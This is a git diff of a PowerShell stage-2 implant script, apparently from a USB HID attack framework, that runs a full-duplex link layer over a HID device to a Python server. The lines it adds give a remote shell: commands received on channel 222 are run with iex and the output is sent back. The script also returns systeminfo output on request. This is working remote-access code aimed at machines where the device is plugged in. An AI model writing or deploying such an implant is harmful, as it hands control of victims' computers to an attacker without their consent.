@@ -1,5 +1,3 @@
-﻿
-
 ###################################################
 # Create LinkLayer Custom Object (Stage 2 work)
 ###################################################
@@ -453,38 +451,21 @@ $LinkLayer | Add-Member -MemberType ScriptMethod -Name "Connect" -Value {
 }
 
 
+$LinkLayer.Init($HIDin, $HIDout) # init link layer state
 
-#########################
-# test of link layer
-#########################
+$LinkLayer.Connect() # re-synchronize full duplex connection (resets python server queues and re-syncs ACK to SEQ)
 
-$STREAM_TYPE_ECHO_REQUEST = 2
+$LinkLayer.Start() # start link layer threads (we quit STOP-AND-WAIT ARQ and turn over to GO-BACK-N to achieve full duplex transfer speed)
 
-# Test function to enque output
-#  qout:                output queue to use
-#  stream_size:         size to use for single stream which gets enqueued
-#  max_bytes:           max bytes to enqueue at all
-#function TEST_enqueue_ouput($qout, $stream_size, $max_bytes)
-function TEST_enqueue_ouput($LinkLayer, $stream_size, $max_bytes)
-{
-    #[System.Console]::WriteLine("Enqueue $max_bytes Bytes output data split into streams of $stream_size bytes, each...")
+##################
+# Stage 3
+####################
 
-    for ($i = 0; $i -lt ($max_bytes/$stream_size); $i++)
-    {
-        $utf8_msg = "Stream Nr. $i from Powershell, size $stream_size (filled up with As) ..."
-        $fill = "A" * ($stream_size - $utf8_msg.Length)
-        $utf8_msg += $fill
-        # convert to bytes (interpret as UTF8)
-        $payload =[system.Text.Encoding]::UTF8.GetBytes($utf8_msg)
-        #$qout.Enqueue($payload)
-        $stream_type = [BitConverter]::GetBytes([int] $STREAM_TYPE_ECHO_REQUEST)
 
-        $LinkLayer.PushOutputStream($stream_type + $payload)
-    }
-
-    #[System.Console]::WriteLine("... done pushing data into output queue")
-}
-
+# assure correct encoding if system commands are ran
+$OutputEncoding = New-Object -TypeName System.Text.UTF8Encoding
+[Console]::OutputEncoding = $OutputEncoding
+[Console]::WriteLine("Encoding set to UTF8... Test üÜ")
 
 ###
 # Client implementatopn
@@ -493,8 +474,8 @@ function parse_stream()
 {
     param([Byte[]] $stream)
 
-    $channel_type = $stream[0] -band 15
-    $channel_subtype = $stream[0] -shr 4
+    $channel_subtype = $stream[0] -band 15
+    $channel_type = $stream[0] -shr 4
     if ($stream.Length -gt 1)
     {
         $data = [Byte[]] $stream[1..($stream.Length-1)]
@@ -514,7 +495,7 @@ function send_data()
 {
     param($channel_type, $channel_subtype, $data)
 
-    $stream = [Byte[]] ($channel_type + ($channel_subtype -shl 4)) + ($data)
+    $stream = [Byte[]] ($channel_subtype + ($channel_type -shl 4)) + ($data)
     $LinkLayer.PushOutputStream($stream)
 }
 
@@ -537,6 +518,13 @@ function handle_request()
     $CHANNEL_SUBTYPE_CONTROL_SERVER_SYSINFO_REQUEST = 3
     $CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE = 3
 
+    $CHANNEL_SUBTYPE_PROCESS_STDIN = 1
+    $CHANNEL_SUBTYPE_PROCESS_STDOUT = 2
+    $CHANNEL_SUBTYPE_PROCESS_STDERR = 3
+    $CHANNEL_SUBTYPE_PROCESS_CTRL_TO_PROC = 4
+    $CHANNEL_SUBTYPE_PROCESS_CTRL_FROM_PROC = 5
+
+
     if ($parsed.channel_type -eq $CHANNEL_TYPE_CONTROL)
     {
         # control channel
@@ -544,7 +532,60 @@ function handle_request()
         {
             [Console]::WriteLine("Received sysinfo request")
             send_data -channel_type $CHANNEL_TYPE_CONTROL -channel_subtype $CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE -data ([System.Text.Encoding]::UTF8.GetBytes((systeminfo.exe | Out-String)))
-            #send_data -channel_type $CHANNEL_TYPE_CONTROL -channel_subtype $CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE -data ([System.Text.Encoding]::UTF8.GetBytes("üÜäÄ"))
+            
+        }
+        else
+        {
+            $host.UI.WriteLine("Unknown data:")
+            [System.Console]::WriteLine($parsed)
+        }
+    }
+    elseif  ($parsed.channel_type -eq $CHANNEL_TYPE_PROCESS)
+    {
+        $channel_id = $parsed.data[0]
+        $parsed.data = $parsed.data[1..($parsed.data.Length - 1)]
+
+        [Console]::WriteLine("Handler: CHANNEL_TYPE_PROCESS")
+        if ($parsed.channel_subtype -eq $CHANNEL_SUBTYPE_PROCESS_STDIN)
+        {
+            [Console]::WriteLine("Handler: CHANNEL_SUBTYPE_PROCESS_STDIN, channel ID {0}" -f $channel_id)
+
+            # if channel == 222 we assume this to be input to a PowerShell process' stdin
+            if ($channel_id -eq 222)
+            {
+                $command = ([System.Text.Encoding]::UTF8.GetString($parsed.data))
+                [Console]::WriteLine("Handler: PowerShell STDIN: {0}" -f $command)
+
+                try
+                {
+                    # send back on stdout
+                    $result = (iex $command)
+                    #if ($result) { $result = $result.toString() }
+                    # note width could be choosen by P4wnPq HID python server
+                    if ($result) { $result = ($result | Out-String -Width 80) }
+                    
+                    # if the command doesn't produce output, we have to generate a new-line at least, as the python endpoint is waiting for
+                    # resulting data after sending a command
+                    
+                    if ($result -eq "" -or $result -eq $null) { $result = "`n" }
+                    $ret_data = ([Byte[]] ($channel_id) + [System.Text.Encoding]::UTF8.GetBytes($result))
+
+                    $result
+                    send_data -channel_type $CHANNEL_TYPE_PROCESS -channel_subtype $CHANNEL_SUBTYPE_PROCESS_STDOUT -data  $ret_data
+                }
+                catch
+                {
+                    $err = $_.Exception.Message
+                    # send back on stderr
+                    $ret_data = ([Byte[]] ($channel_id) + [System.Text.Encoding]::UTF8.GetBytes($err))
+                    send_data -channel_type $CHANNEL_TYPE_PROCESS -channel_subtype $CHANNEL_SUBTYPE_PROCESS_STDERR -data  $ret_data
+                }
+
+            }
+        }
+        elseif ($parsed.channel_subtype -eq $CHANNEL_SUBTYPE_PROCESS_STDOUT)
+        {
+            [Console]::WriteLine("Handler: CHANNEL_SUBTYPE_PROCESS_STDOUT, channel ID {0}" -f $channel_id)
         }
     }
     else
@@ -555,38 +596,8 @@ function handle_request()
 }
 
 
-# vars are created by stage1
-#$HIDin = $devfile
-#$HIDout = $devfile
-
-#####
-# DEBUG
-
-$stage1 = Get-Content fullduplex_stage1.ps1 | Out-String # we load stage 2 from disk
-iex $stage1
-
-# END DEBUG
-#######
-
-
-# assure correct encoding if system commands are ran
-$OutputEncoding = New-Object -TypeName System.Text.UTF8Encoding
-[Console]::OutputEncoding = New-Object -TypeName System.Text.UTF8Encoding
-[Console]::WriteLine("Encoding set to UTF8... Test üÜ")
-
-
-
-$LinkLayer.Init($HIDin, $HIDout) # init link layer state
-
-$LinkLayer.Connect() # re-synchronize full duplex connection (resets python server queues and re-syncs ACK to SEQ)
-
-
-
 try
 {
-    $LinkLayer.Start() # start link layer threads (we quit STOP-AND-WAIT ARQ and turn over to GO-BACK-N to achieve full duplex transfer speed)
-    
-
     ##################
     # Test 2: Go on sending data, measure transfer rate of received data (but throw away received streams) in 1000ms interval
     ##################
@@ -617,8 +628,8 @@ try
         {
             # pop and throw away, we only count received bytes
             $stream = $LinkLayer.PopPendingInputStream()
-            $utf8 = ([System.Text.Encoding]::UTF8.GetString($stream))
-            $host.UI.WriteLine("{0}" -f $utf8) 
+#            $utf8 = ([System.Text.Encoding]::UTF8.GetString($stream))
+#            $host.UI.WriteLine("{0}" -f $utf8) 
 
             handle_request -stream $stream
 
@@ -644,3 +655,4 @@ finally
     
     [Console]::WriteLine("Goodbye")
 }
+
